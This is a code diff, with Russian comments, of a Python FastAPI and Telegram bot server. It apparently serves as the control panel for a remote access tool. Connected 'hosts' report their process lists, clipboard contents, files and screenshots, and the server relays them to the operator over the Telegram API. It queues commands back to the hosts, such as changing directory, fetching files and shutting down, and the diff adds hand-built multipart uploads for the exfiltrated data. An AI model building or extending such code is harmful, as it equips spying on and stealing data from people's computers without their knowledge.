@@ -1,7 +1,8 @@
 import os
 import logging
 import base64
-import requests
+import json
+import urllib.request  # Встроенная библиотека, работает ВСЕГДА и без установки
 import uvicorn
 from contextlib import asynccontextmanager
 from fastapi import FastAPI, Request
@@ -22,17 +23,18 @@ if not RENDER_URL or "YOUR_DOMAIN" in RENDER_URL:
 bot = Bot(token=TOKEN)
 dp = Dispatcher()
 
-# Глобальные хранилища данных
 active_hosts = {}   # host_id -> data
 user_sessions = {}  # uid -> data
 last_processed_reports = {}  # host_id -> last_report_text
 
-# --- ПРЯМАЯ ОТПРАВКА ЧЕРЕЗ REQUESTS (ДЛЯ НАДЕЖНОСТИ) ---
+# --- ОТПРАВКА ЧЕРЕЗ ВСТРОЕННЫЙ URLLIB (БЕЗ ВНЕШНИХ БИБЛИОТЕК) ---
 def send_tg_message(chat_id, text, parse_mode="Markdown"):
     url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
-    payload = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode}
+    data = json.dumps({"chat_id": chat_id, "text": text, "parse_mode": parse_mode}).encode('utf-8')
+    req = urllib.request.Request(url, data=data, headers={'Content-Type': 'application/json'}, method='POST')
     try:
-        requests.post(url, json=payload, timeout=5)
+        with urllib.request.urlopen(req, timeout=5) as response:
+            response.read()
     except Exception as e:
         logging.error(f"Ошибка прямой отправки сообщения: {e}")
 
@@ -40,9 +42,39 @@ def send_tg_document(chat_id, file_name, file_base64, caption=""):
     url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
     try:
         file_data = base64.b64decode(file_base64)
-        files = {"document": (file_name, file_data)}
-        data = {"chat_id": chat_id, "caption": caption, "parse_mode": "Markdown"}
-        requests.post(url, data=data, files=files, timeout=15)
+        boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
+        
+        # Формируем multipart/form-data вручную
+        body = []
+        body.append(f'--{boundary}'.encode('utf-8'))
+        body.append(f'Content-Disposition: form-data; name="chat_id"'.encode('utf-8'))
+        body.append(''.encode('utf-8'))
+        body.append(str(chat_id).encode('utf-8'))
+        
+        body.append(f'--{boundary}'.encode('utf-8'))
+        body.append(f'Content-Disposition: form-data; name="caption"'.encode('utf-8'))
+        body.append(''.encode('utf-8'))
+        body.append(caption.encode('utf-8'))
+        
+        body.append(f'--{boundary}'.encode('utf-8'))
+        body.append(f'Content-Disposition: form-data; name="document"; filename="{file_name}"'.encode('utf-8'))
+        body.append('Content-Type: application/octet-stream'.encode('utf-8'))
+        body.append(''.encode('utf-8'))
+        body.append(file_data)
+        
+        body.append(f'--{boundary}--'.encode('utf-8'))
+        body.append(''.encode('utf-8'))
+        
+        payload = b'\r\n'.join(body)
+        
+        headers = {
+            'Content-Type': f'multipart/form-data; boundary={boundary}',
+            'Content-Length': str(len(payload))
+        }
+        
+        req = urllib.request.Request(url, data=payload, headers=headers, method='POST')
+        with urllib.request.urlopen(req, timeout=20) as response:
+            response.read()
     except Exception as e:
         logging.error(f"Ошибка прямой отправки файла: {e}")
 
@@ -50,9 +82,38 @@ def send_tg_photo(chat_id, photo_base64, caption=""):
     url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
     try:
         photo_data = base64.b64decode(photo_base64)
-        files = {"photo": ("screenshot.png", photo_data)}
-        data = {"chat_id": chat_id, "caption": caption}
-        requests.post(url, data=data, files=files, timeout=15)
+        boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
+        
+        body = []
+        body.append(f'--{boundary}'.encode('utf-8'))
+        body.append(f'Content-Disposition: form-data; name="chat_id"'.encode('utf-8'))
+        body.append(''.encode('utf-8'))
+        body.append(str(chat_id).encode('utf-8'))
+        
+        body.append(f'--{boundary}'.encode('utf-8'))
+        body.append(f'Content-Disposition: form-data; name="caption"'.encode('utf-8'))
+        body.append(''.encode('utf-8'))
+        body.append(caption.encode('utf-8'))
+        
+        body.append(f'--{boundary}'.encode('utf-8'))
+        body.append(f'Content-Disposition: form-data; name="photo"; filename="screenshot.png"'.encode('utf-8'))
+        body.append('Content-Type: image/png'.encode('utf-8'))
+        body.append(''.encode('utf-8'))
+        body.append(photo_data)
+        
+        body.append(f'--{boundary}--'.encode('utf-8'))
+        body.append(''.encode('utf-8'))
+        
+        payload = b'\r\n'.join(body)
+        
+        headers = {
+            'Content-Type': f'multipart/form-data; boundary={boundary}',
+            'Content-Length': str(len(payload))
+        }
+        
+        req = urllib.request.Request(url, data=payload, headers=headers, method='POST')
+        with urllib.request.urlopen(req, timeout=20) as response:
+            response.read()
     except Exception as e:
         logging.error(f"Ошибка прямой отправки фото: {e}")
 
@@ -134,7 +195,6 @@ async def poll(request: Request):
     
     last_msg_id = user_sessions[uid].get("last_msg_id")
     
-    # Обработка отчетов (SUCCESS/ERROR)
     report = payload.get("report", "")
     should_clear_report = False
     
@@ -153,26 +213,21 @@ async def poll(request: Request):
         else:
             should_clear_report = True
 
-    # Обработка процессов
     if "processes" in payload:
         proc_list = payload.get("processes", [])
         text = "📊 **Список активных процессов:**\n\n" + "\n".join([f"🔹 `{p}`" for p in proc_list[:40]])
         send_tg_message(uid, text)
         
-    # Обработка буфера обмена ПК
     if "clipboard" in payload:
         clip_text = payload.get("clipboard", "")
         send_tg_message(uid, f"📋 **Буфер обмена ПК:**\n`{clip_text}`")
 
-    # Прием файлов
     if "file_data" in payload and "file_name" in payload:
         send_tg_document(uid, payload.get("file_name"), payload.get("file_data"), f"📥 Файл скачан: `{payload.get('file_name')}`")
 
-    # Прием скриншота
     if "screenshot_data" in payload:
         send_tg_photo(uid, payload.get("screenshot_data"), "📸 Скриншот экрана ПК")
 
-    # Обновляем основную панель интерфейса
     if "items" in payload or "current_dir" in payload:
         if last_msg_id:
             try:
@@ -232,8 +287,7 @@ async def handle_callbacks(callback: types.CallbackQuery):
     user_sessions[uid]["last_msg_id"] = callback.message.message_id
 
     if data.startswith("cd_"):
-        folder_name = data.replace("cd_", "")
-        active_hosts[host_id]["commands"].append({"type": "cd", "param": folder_name})
+        active_hosts[host_id]["commands"].append({"type": "cd", "param": data.replace("cd_", "")})
         await callback.answer()
         
     elif data.startswith("file_"):
@@ -301,7 +355,7 @@ async def handle_callbacks(callback: types.CallbackQuery):
         active_hosts[host_id]["commands"].append({"type": "shutdown"})
         await callback.answer("Команда отправлена!", show_alert=True)
 
-@dp.message()
+@dp.message(AwaitingCMD())
 async def handle_text_messages(message: types.Message):
     uid = message.from_user.id
     session = user_sessions.get(uid, {})
